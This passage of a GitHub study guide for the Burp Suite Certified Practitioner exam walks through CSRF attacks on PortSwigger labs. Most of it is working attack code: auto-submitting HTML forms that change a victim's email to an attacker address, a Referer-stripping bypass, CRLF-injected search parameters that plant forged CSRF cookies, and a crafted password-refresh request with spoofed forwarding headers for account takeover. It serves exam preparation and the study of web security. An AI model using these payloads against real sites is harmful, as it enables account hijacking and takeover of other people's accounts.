		history.pushState('', '', '/?TARGET.net');
	&lt;/script&gt;
    &lt;form action=&quot;https://TARGET.net/my-account/change-email&quot; method=&quot;POST&quot;&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacker&amp;#64;exploit&amp;#45;net&quot; /&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">html</span><span class="pl-kos">&gt;</span>
  <span class="pl-c">&lt;!-- CSRF PoC -  CSRF with broken Referer validation --&gt;</span>
  <span class="pl-kos">&lt;</span><span class="pl-ent">body</span><span class="pl-kos">&gt;</span>
	<span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
		<span class="pl-s1">history</span><span class="pl-kos">.</span><span class="pl-en">pushState</span><span class="pl-kos">(</span><span class="pl-s">''</span><span class="pl-kos">,</span> <span class="pl-s">''</span><span class="pl-kos">,</span> <span class="pl-s">'/?TARGET.net'</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
	<span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
    <span class="pl-kos">&lt;</span><span class="pl-ent">form</span> <span class="pl-c1">action</span>="<span class="pl-s">https://TARGET.net/my-account/change-email</span>" <span class="pl-c1">method</span>="<span class="pl-s">POST</span>"<span class="pl-kos">&gt;</span>
      <span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">type</span>="<span class="pl-s">hidden</span>" <span class="pl-c1">name</span>="<span class="pl-s">email</span>" <span class="pl-c1">value</span>="<span class="pl-s">hacker&amp;#64;exploit&amp;#45;net</span>" <span class="pl-kos">/&gt;</span>
      <span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">type</span>="<span class="pl-s">submit</span>" <span class="pl-c1">value</span>="<span class="pl-s">Submit request</span>" <span class="pl-kos">/&gt;</span>
    <span class="pl-kos">&lt;/</span><span class="pl-ent">form</span><span class="pl-kos">&gt;</span>
    <span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
      <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">forms</span><span class="pl-kos">[</span><span class="pl-c1">0</span><span class="pl-kos">]</span><span class="pl-kos">.</span><span class="pl-en">submit</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
  <span class="pl-kos">&lt;/</span><span class="pl-ent">body</span><span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">html</span><span class="pl-kos">&gt;</span></pre></div>
<blockquote>
<p dir="auto">When above exploit payload is delivered to victim, the CSRF POC payload changes the victim email to <strong><a href="mailto:hacker@exploit.net">hacker@exploit.net</a></strong>, because the Referer header contained target in value. In <em><strong>BSCP</strong></em> exam take not of your <code>hacker@exploit</code> server email address to use in account takeover.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken" rel="nofollow">PortSwigger Lab: CSRF with broken Referer validation</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Referer Header Present</h3><a id="user-content-referer-header-present" class="anchor" aria-label="Permalink: Referer Header Present" href="#referer-header-present"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">In the update email request when changing the <code>referer</code> header the response indicate <code>Invalid referer header</code>, <em><strong>identifying</strong></em> CSRF vulnerability. Using the <code>&lt;meta name="referrer" content="no-referrer"&gt;</code> as part of the exploit server CSRF PoC this control can be bypassed. This instruct the exploit server to Deliver Exploit to victim without <code>referer</code> header.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;html&gt;
  &lt;!-- CSRF PoC - CSRF where Referer validation depends on header being present --&gt;
  &lt;body&gt;
&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;
    &lt;form action=&quot;https://TARGET.net/my-account/change-email&quot; method=&quot;POST&quot;&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;administrator&amp;#64;EXPLOIT&amp;#46;NET&quot; /&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
    &lt;/form&gt;
    &lt;script&gt;
history.pushState('', '', '/');
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">html</span><span class="pl-kos">&gt;</span>
  <span class="pl-c">&lt;!-- CSRF PoC - CSRF where Referer validation depends on header being present --&gt;</span>
  <span class="pl-kos">&lt;</span><span class="pl-ent">body</span><span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;</span><span class="pl-ent">meta</span> <span class="pl-c1">name</span>="<span class="pl-s">referrer</span>" <span class="pl-c1">content</span>="<span class="pl-s">no-referrer</span>"<span class="pl-kos">&gt;</span>
    <span class="pl-kos">&lt;</span><span class="pl-ent">form</span> <span class="pl-c1">action</span>="<span class="pl-s">https://TARGET.net/my-account/change-email</span>" <span class="pl-c1">method</span>="<span class="pl-s">POST</span>"<span class="pl-kos">&gt;</span>
      <span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">type</span>="<span class="pl-s">hidden</span>" <span class="pl-c1">name</span>="<span class="pl-s">email</span>" <span class="pl-c1">value</span>="<span class="pl-s">administrator&amp;#64;EXPLOIT&amp;#46;NET</span>" <span class="pl-kos">/&gt;</span>
      <span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">type</span>="<span class="pl-s">submit</span>" <span class="pl-c1">value</span>="<span class="pl-s">Submit request</span>" <span class="pl-kos">/&gt;</span>
    <span class="pl-kos">&lt;/</span><span class="pl-ent">form</span><span class="pl-kos">&gt;</span>
    <span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
<span class="pl-s1">history</span><span class="pl-kos">.</span><span class="pl-en">pushState</span><span class="pl-kos">(</span><span class="pl-s">''</span><span class="pl-kos">,</span> <span class="pl-s">''</span><span class="pl-kos">,</span> <span class="pl-s">'/'</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
      <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">forms</span><span class="pl-kos">[</span><span class="pl-c1">0</span><span class="pl-kos">]</span><span class="pl-kos">.</span><span class="pl-en">submit</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
  <span class="pl-kos">&lt;/</span><span class="pl-ent">body</span><span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">html</span><span class="pl-kos">&gt;</span></pre></div>
<blockquote>
<p dir="auto">This is interactive exploit and in BSCP exam if the stage 1 exploit was non interactive then this can be used to obtain administrator interaction by her clicking on the link to change their password. Note to check the <code>source code</code> of the change email page for any additional form id values.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-referer-present.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf-referer-present.png" alt="csrf referer present" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present" rel="nofollow">PortSwigger Lab: CSRF where Referer validation depends on header being present</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">LastSearchTerm</h3><a id="user-content-lastsearchterm" class="anchor" aria-label="Permalink: LastSearchTerm" href="#lastsearchterm"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> the CSRF vulnerability where token not tied to non-session cookie, by changing the <strong>csrfkey</strong> cookie and seeing the result that the request is rejected. Observe the <strong>LastSearchTerm</strong> cookie value containing the user supplied input from the search parameter.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-csrf-non-session-tied.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-csrf-non-session-tied.png" alt="identify-csrf-non-session-tied.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Search function has no CSRF protection, create below payload that injects new line characters <code>%0d%0a</code> to set new cookie value in response, and use this to inject cookies into the victim user's browser.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None"><pre class="notranslate"><code>/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None
</code></pre></div>
<blockquote>
<p dir="auto">Generate CSRF POC, Enable the option to include an <strong>auto-submit</strong> script and click <strong>Regenerate</strong>. Remove the <strong>auto-submit</strong> script code block and add following instead, and place <code>history.pushState</code> script code below body header. The <strong>onerror</strong> of the IMG SRC tag will instead submit the CSRF POC.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="&lt;img src=&quot;https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None&quot; onerror=&quot;document.forms[0].submit()&quot;&gt;"><pre class="notranslate"><code>&lt;img src="https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None" onerror="document.forms[0].submit()"&gt;
</code></pre></div>
<blockquote>
<p dir="auto">During BSCP <strong>Exam</strong> set the email change value to that of the exploit server <em><strong><a href="mailto:hacker@exploit-server.net">hacker@exploit-server.net</a></strong></em> email address. Then you can change the administrator password with the reset function.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-set-cookie-poc.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf-set-cookie-poc.png" alt="csrf set cookie poc" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">In the below CSRF PoC code, the hidden csrf value is the one generated by the <strong>change email</strong> function and the csrfkey value in the <code>img src</code> is the value of the victim, obtained by logging on as victim provided credentials. not sure in exam but real world this is test to be performed.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;html&gt;
  &lt;body&gt;
    &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action=&quot;https://TARGET.net/my-account/change-email&quot; method=&quot;POST&quot;&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacker&amp;#64;exploit&amp;#45;0a18002e03379f0ccf16180f01180022&amp;#46;exploit&amp;#45;server&amp;#46;net&quot; /&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;48hizVRa9oJ1slhOIPljozUAjqDMdplb&quot; /&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
    &lt;/form&gt;
	&lt;img src=&quot;https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=NvKm20fiUCAySRSHHSgH7hwonb21oVUZ%3b%20SameSite=None&quot; onerror=&quot;document.forms[0].submit()&quot;&gt;    
  &lt;/body&gt;
&lt;/html&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">html</span><span class="pl-kos">&gt;</span>
  <span class="pl-kos">&lt;</span><span class="pl-ent">body</span><span class="pl-kos">&gt;</span>
    <span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span><span class="pl-s1">history</span><span class="pl-kos">.</span><span class="pl-en">pushState</span><span class="pl-kos">(</span><span class="pl-s">''</span><span class="pl-kos">,</span> <span class="pl-s">''</span><span class="pl-kos">,</span> <span class="pl-s">'/'</span><span class="pl-kos">)</span><span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
    <span class="pl-kos">&lt;</span><span class="pl-ent">form</span> <span class="pl-c1">action</span>="<span class="pl-s">https://TARGET.net/my-account/change-email</span>" <span class="pl-c1">method</span>="<span class="pl-s">POST</span>"<span class="pl-kos">&gt;</span>
      <span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">type</span>="<span class="pl-s">hidden</span>" <span class="pl-c1">name</span>="<span class="pl-s">email</span>" <span class="pl-c1">value</span>="<span class="pl-s">hacker&amp;#64;exploit&amp;#45;0a18002e03379f0ccf16180f01180022&amp;#46;exploit&amp;#45;server&amp;#46;net</span>" <span class="pl-kos">/&gt;</span>
      <span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">type</span>="<span class="pl-s">hidden</span>" <span class="pl-c1">name</span>="<span class="pl-s">csrf</span>" <span class="pl-c1">value</span>="<span class="pl-s">48hizVRa9oJ1slhOIPljozUAjqDMdplb</span>" <span class="pl-kos">/&gt;</span>
      <span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">type</span>="<span class="pl-s">submit</span>" <span class="pl-c1">value</span>="<span class="pl-s">Submit request</span>" <span class="pl-kos">/&gt;</span>
    <span class="pl-kos">&lt;/</span><span class="pl-ent">form</span><span class="pl-kos">&gt;</span>
	<span class="pl-kos">&lt;</span><span class="pl-ent">img</span> <span class="pl-c1">src</span>="<span class="pl-s">https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=NvKm20fiUCAySRSHHSgH7hwonb21oVUZ%3b%20SameSite=None</span>" <span class="pl-c1">onerror</span>="<span class="pl-s">document.forms[0].submit()</span>"<span class="pl-kos">&gt;</span>    
  <span class="pl-kos">&lt;/</span><span class="pl-ent">body</span><span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">html</span><span class="pl-kos">&gt;</span></pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie" rel="nofollow">PortSwigger Lab: CSRF where token is tied to non-session cookie</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">CSRF duplicated in cookie</h3><a id="user-content-csrf-duplicated-in-cookie" class="anchor" aria-label="Permalink: CSRF duplicated in cookie" href="#csrf-duplicated-in-cookie"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">In the target we <em><strong>identify</strong></em> that the CSRF key token is duplicated in the cookie value. Another <em><strong>indicator</strong></em> is the cookie <code>LastSearchTerm</code> contain the value searched. By giving search value that contain <code>%0d%0a</code> we can inject an <strong>end of line</strong> and <strong>new line</strong> characters to create new CSRF cookie and value.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/set-cookie-csrf-fake.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/set-cookie-csrf-fake.png" alt="set cookie csrf fake" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">In the exploit code <code>img src</code> tag we set cookie for csrf to fake.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;html&gt;
  &lt;body&gt;
    &lt;form action=&quot;https://TARGET.net/my-account/change-email&quot; method=&quot;POST&quot;&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;ATTACKER&amp;#64;EXPLOIT-SERVER&amp;#46;NET&quot; /&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;fake&quot; /&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
    &lt;/form&gt;
    &lt;img src=&quot;https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None&quot; onerror=&quot;document.forms[0].submit();&quot;/&gt;
  &lt;/body&gt;
&lt;/html&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">html</span><span class="pl-kos">&gt;</span>
  <span class="pl-kos">&lt;</span><span class="pl-ent">body</span><span class="pl-kos">&gt;</span>
    <span class="pl-kos">&lt;</span><span class="pl-ent">form</span> <span class="pl-c1">action</span>="<span class="pl-s">https://TARGET.net/my-account/change-email</span>" <span class="pl-c1">method</span>="<span class="pl-s">POST</span>"<span class="pl-kos">&gt;</span>
      <span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">type</span>="<span class="pl-s">hidden</span>" <span class="pl-c1">name</span>="<span class="pl-s">email</span>" <span class="pl-c1">value</span>="<span class="pl-s">ATTACKER&amp;#64;EXPLOIT-SERVER&amp;#46;NET</span>" <span class="pl-kos">/&gt;</span>
      <span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">type</span>="<span class="pl-s">hidden</span>" <span class="pl-c1">name</span>="<span class="pl-s">csrf</span>" <span class="pl-c1">value</span>="<span class="pl-s">fake</span>" <span class="pl-kos">/&gt;</span>
      <span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">type</span>="<span class="pl-s">submit</span>" <span class="pl-c1">value</span>="<span class="pl-s">Submit request</span>" <span class="pl-kos">/&gt;</span>
    <span class="pl-kos">&lt;/</span><span class="pl-ent">form</span><span class="pl-kos">&gt;</span>
    <span class="pl-kos">&lt;</span><span class="pl-ent">img</span> <span class="pl-c1">src</span>="<span class="pl-s">https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None</span>" <span class="pl-c1">onerror</span>="<span class="pl-s">document.forms[0].submit();</span>"<span class="pl-kos">/&gt;</span>
  <span class="pl-kos">&lt;/</span><span class="pl-ent">body</span><span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">html</span><span class="pl-kos">&gt;</span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-duplicated-cookie.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf-duplicated-cookie.png" alt="csrf duplicated cookie" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie" rel="nofollow">PortSwigger Lab: CSRF where token is duplicated in cookie</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">CSRF Token Present</h3><a id="user-content-csrf-token-present" class="anchor" aria-label="Permalink: CSRF Token Present" href="#csrf-token-present"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Changing the value of the <code>csrf</code> parameter result in change email request being <strong>rejected</strong>. Deleting the CSRF token allow the change email to be <strong>accepted</strong>, and this <em><strong>identify</strong></em> that the validation of token being present is vulnerable.</p>
</blockquote>
<blockquote>
<p dir="auto">CSRF PoC Payload hosted on exploit server:</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;form method=&quot;POST&quot; action=&quot;https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email&quot;&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;$param1name&quot; value=&quot;$param1value&quot;&gt;
&lt;/form&gt;
&lt;script&gt;
    document.forms[0].submit();
&lt;/script&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">form</span> <span class="pl-c1">method</span>="<span class="pl-s">POST</span>" <span class="pl-c1">action</span>="<span class="pl-s">https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email</span>"<span class="pl-kos">&gt;</span>
    <span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">type</span>="<span class="pl-s">hidden</span>" <span class="pl-c1">name</span>="<span class="pl-s">$param1name</span>" <span class="pl-c1">value</span>="<span class="pl-s">$param1value</span>"<span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">form</span><span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
    <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">forms</span><span class="pl-kos">[</span><span class="pl-c1">0</span><span class="pl-kos">]</span><span class="pl-kos">.</span><span class="pl-en">submit</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-present-validation-fail.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf-present-validation-fail.png" alt="csrf present validation fail" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present" rel="nofollow">PortSwigger Lab: CSRF where token validation depends on token being present</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Is Logged In</h3><a id="user-content-is-logged-in" class="anchor" aria-label="Permalink: Is Logged In" href="#is-logged-in"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">If cookie with the <strong>isloggedin</strong> name is <em><strong>identified</strong></em>, then a refresh of admin password POST request could be exploited.<br>
Change username parameter to administrator while logged in as low privilege user.<br>
CSRF token is not tied to user session.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="POST /refreshpassword HTTP/1.1
Host: TARGET.net
Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d
Content-Length: 60
Cache-Control: max-age=0
Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;109&quot;, &quot;Not_A Brand&quot;;v=&quot;99&quot;
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: &quot;Linux&quot;
Upgrade-Insecure-Requests: 1
Origin: https://TARGET.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;
X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
X-Forwarded-Server: EXPLOIT.net
Referer: https://TARGET.net/refreshpassword
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

csrf=TOKEN&amp;username=administrator"><pre>POST /refreshpassword HTTP/1.1
Host: TARGET.net
Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d
Content-Length: 60
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://TARGET.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;
X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
X-Forwarded-Server: EXPLOIT.net
Referer: https://TARGET.net/refreshpassword
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

csrf=TOKEN&amp;username=administrator</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-privesc.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf-privesc.png" alt="CSRF privesc" style="max-width: 100%;"></a></p>
